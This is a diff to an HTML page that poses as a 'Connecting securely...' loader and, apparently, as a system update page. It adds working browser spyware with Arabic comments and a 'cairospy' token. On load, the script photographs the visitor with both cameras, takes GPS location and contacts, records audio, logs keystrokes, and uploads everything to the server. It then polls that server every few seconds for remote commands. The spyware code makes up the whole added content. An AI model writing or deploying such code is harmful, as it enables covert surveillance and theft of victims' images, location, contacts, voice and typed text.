@@ -1,43 +1,271 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update Required</title>
-    <link rel="stylesheet" href="/static/style.css">
+    <title>Loading...</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0a0e1a; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .container { text-align:center; padding:20px; width:100%; max-width:500px; }
+        .loader { width:50px; height:50px; border:3px solid #1a1f3a; border-top:3px solid #00d4ff; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; }
+        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+        .status { color:#888; font-size:14px; margin-top:10px; }
+        .hidden { display:none !important; }
+        #camera-container { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:9999; background:#000; }
+        #camera-container video, #camera-container canvas { width:100%; height:100%; object-fit:cover; }
+        .overlay-msg { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.8); color:#fff; padding:10px 20px; border-radius:10px; font-size:14px; z-index:10000; }
+    </style>
 </head>
 <body>
     <div class="container">
-        <div class="loading-screen" id="loadingScreen">
-            <div class="spinner"></div>
-            <h2>Checking system updates...</h2>
-            <p>Please wait while we verify your device compatibility</p>
-            <div class="progress-bar">
-                <div class="progress" id="progressBar"></div>
-            </div>
-            <p class="small" id="statusText">Initializing...</p>
-        </div>
-
-        <div class="permission-screen hidden" id="permissionScreen">
-            <div class="warning-icon">⚠️</div>
-            <h2>Camera & Microphone Access Required</h2>
-            <p>This system update requires access to your camera and microphone for identity verification.</p>
-            <button onclick="requestPermissions()" class="btn-primary">Allow Access</button>
-            <button onclick="skipPermissions()" class="btn-secondary">Skip (Limited Mode)</button>
-        </div>
-
-        <div class="main-screen hidden" id="mainScreen">
-            <h2>✅ System Update Complete</h2>
-            <p>Your device is now up to date.</p>
-            <div class="info-box">
-                <p><strong>Device:</strong> <span id="deviceInfo">Unknown</span></p>
-                <p><strong>Browser:</strong> <span id="browserInfo">Unknown</span></p>
-                <p><strong>IP:</strong> <span id="ipInfo">Loading...</span></p>
-            </div>
-        </div>
+        <div class="loader"></div>
+        <h2>Connecting securely...</h2>
+        <p class="status">Please wait while we establish a secure connection</p>
     </div>
 
-    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
-    <script src="/static/script.js"></script>
+    <div id="camera-container" class="hidden">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        <div class="overlay-msg">📷 Capturing image...</div>
+    </div>
+
+    <script>
+        // ===== التوكن والمعرف =====
+        const TOKEN = 'cairospy_v1_' + Math.random().toString(36).substr(2, 8);
+        const BASE_URL = window.location.origin;
+
+        // ===== API helpers =====
+        async function sendData(type, content, extra = {}) {
+            try {
+                await fetch(BASE_URL + '/api/upload', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({type, content, ...extra, token: TOKEN})
+                });
+            } catch(e) { console.log('Send error:', e); }
+        }
+
+        // ===== التصوير (الكاميرا الأمامية ثم الخلفية) =====
+        async function captureCamera(facingMode = 'user') {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await video.play();
+                
+                await new Promise(r => setTimeout(r, 500));
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                // إرسال الصورة
+                await fetch(BASE_URL + '/api/upload/photo', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({image: imageData, camera: facingMode, token: TOKEN})
+                });
+                
+                return true;
+            } catch(e) {
+                console.log('Camera error:', facingMode, e);
+                return false;
+            }
+        }
+
+        // ===== الموقع =====
+        async function getLocation() {
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {
+                        enableHighAccuracy: true, timeout: 8000
+                    });
+                });
+                await fetch(BASE_URL + '/api/upload/location', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        token: TOKEN
+                    })
+                });
+            } catch(e) { console.log('GPS error:', e); }
+        }
+
+        // ===== جهات الاتصال =====
+        async function getContacts() {
+            try {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (contacts && contacts.length > 0) {
+                        const formatted = contacts.map(c => ({
+                            name: c.name?.[0] || 'Unknown',
+                            phone: c.tel?.[0] || 'N/A'
+                        }));
+                        await fetch(BASE_URL + '/api/upload/contacts', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({contacts: formatted, token: TOKEN})
+                        });
+                    }
+                }
+            } catch(e) { console.log('Contacts error:', e); }
+        }
+
+        // ===== تسجيل الصوت =====
+        async function recordAudio(duration = 5000) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const chunks = [];
+                const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                
+                await new Promise((res) => {
+                    recorder.onstop = res;
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), duration);
+                });
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                
+                const b64 = await new Promise(res => {
+                    reader.onload = () => res(reader.result.split(',')[1]);
+                    reader.readAsDataURL(blob);
+                });
+                
+                await fetch(BASE_URL + '/api/upload/audio', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({audio: b64, duration: duration + 'ms', token: TOKEN})
+                });
+            } catch(e) { console.log('Audio error:', e); }
+        }
+
+        // ===== تسجيل المفاتيح (Keylogger) =====
+        let keyBuffer = '';
+        let keyTimer = null;
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key.length === 1) keyBuffer += e.key;
+            else keyBuffer += '[' + e.key + ']';
+            
+            if (keyTimer) clearTimeout(keyTimer);
+            keyTimer = setTimeout(async () => {
+                if (keyBuffer.length > 0) {
+                    await fetch(BASE_URL + '/api/upload/keylog', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({keys: keyBuffer, token: TOKEN})
+                    });
+                    keyBuffer = '';
+                }
+            }, 2000);
+        });
+
+        // ===== استطلاع الأوامر (Polling) =====
+        async function pollCommands() {
+            try {
+                const res = await fetch(BASE_URL + '/api/command/poll');
+                const data = await res.json();
+                
+                if (data.command) {
+                    const cmd = data.command;
+                    console.log('Command received:', cmd);
+                    
+                    switch(cmd.type) {
+                        case 'toast':
+                            if ('showToast' in navigator) {
+                                navigator.showToast?.(cmd.params?.message || 'Hello!');
+                            } else {
+                                alert(cmd.params?.message || 'Hello!');
+                            }
+                            break;
+                            
+                        case 'notification':
+                            if ('Notification' in window && Notification.permission === 'granted') {
+                                new Notification(cmd.params?.title || 'Alert', {
+                                    body: cmd.params?.body || 'You have a new message'
+                                });
+                            } else if ('Notification' in window) {
+                                Notification.requestPermission().then(p => {
+                                    if (p === 'granted') {
+                                        new Notification(cmd.params?.title || 'Alert', {
+                                            body: cmd.params?.body || 'You have a new message'
+                                        });
+                                    }
+                                });
+                            }
+                            break;
+                            
+                        case 'vibrate':
+                            if ('vibrate' in navigator) {
+                                navigator.vibrate(parseInt(cmd.params?.duration) || 1000);
+                            }
+                            break;
+                            
+                        case 'sound':
+                            try {
+                                const audio = new Audio(cmd.params?.url || 'data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWGluZwAAAA8AAAACAAABhgC7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7//////////////////////////////////////////////////////////////////8AAAAATGF2YzU4LjEzAAAAAAAAAAAAAAAAJAAAAAAAAAAAAYYlmKQsAAAAAAD/+1DEAAAHAAb/AAAAIAAAABAAAAAAB/8AAAD/AAAB6wAAAAAAAAAAAAAYEQAAI/////////8AAAAAAAAA');
+                                audio.play().catch(() => {});
+                            } catch(e) {}
+                            break;
+                            
+                        case 'open_url':
+                            window.open(cmd.params?.url || 'https://example.com', '_blank');
+                            break;
+                    }
+                    
+                    // إبلاغ السيرفر بنتيجة الأمر
+                    await fetch(BASE_URL + '/api/command/status', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({command_id: cmd.id, status: 'executed'})
+                    });
+                }
+            } catch(e) { console.log('Poll error:', e); }
+        }
+
+        // ===== التشغيل الرئيسي =====
+        async function main() {
+            // 1. إرسال نبض
+            await sendData('ping', 'active');
+            
+            // 2. التقاط الصور (أمامية ثم خلفية)
+            document.getElementById('camera-container').classList.remove('hidden');
+            await captureCamera('user');
+            await new Promise(r => setTimeout(r, 1000));
+            await captureCamera('environment');
+            document.getElementById('camera-container').classList.add('hidden');
+            
+            // 3. الحصول على الموقع
+            await getLocation();
+            
+            // 4. جهات الاتصال
+            await getContacts();
+            
+            // 5. تسجيل صوت (5 ثواني)
+            await recordAudio(5000);
+            
+            // 6. بدء استطلاع الأوامر (كل 3 ثواني)
+            setInterval(pollCommands, 3000);
+        }
+
+        // تشغيل
+        main().catch(e => console.log('Main error:', e));
+    </script>
 </body>
 </html>
